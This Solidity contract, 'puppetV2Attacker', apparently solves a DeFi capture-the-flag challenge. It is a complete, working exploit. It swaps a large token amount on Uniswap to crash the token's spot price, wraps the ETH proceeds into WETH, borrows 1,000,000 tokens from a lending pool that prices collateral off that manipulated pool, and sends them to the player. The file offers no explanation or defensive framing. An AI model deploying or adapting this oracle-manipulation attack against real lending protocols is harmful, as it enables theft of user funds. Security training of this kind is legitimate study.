// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IUniswapRouterV2.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

interface IPuppetPool {
    function borrow(uint256 amount) external payable;
}

interface IWETH {
    function deposit() external payable;
}

contract puppetV2Attacker {
    address public immutable puppetPool;
    address public immutable token;
    address public immutable weth;
    address public immutable uniswapRouter;
    address private player;

    constructor (address _puppetPool, address _token, address _weth, address _uniswapRouter, address _player) payable {
        puppetPool = _puppetPool;
        token = _token;
        weth = _weth;
        uniswapRouter = _uniswapRouter;
        player = _player;
    }

    function attack() external {
        IERC20(token).approve(uniswapRouter, 10000 ether);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;
        IUniswapV2Router01(uniswapRouter).swapExactTokensForETH(10000 ether, 1 ether, path, address(this), block.timestamp + 1000);
        uint256 amount = address(this).balance;
        IWETH(weth).deposit{value: amount}();
        IERC20(weth).approve(puppetPool, amount);
        IPuppetPool(puppetPool).borrow(1000000 ether);
        IERC20(token).transfer(player, IERC20(token).balanceOf(address(this)));
    }

    receive() external payable {}

}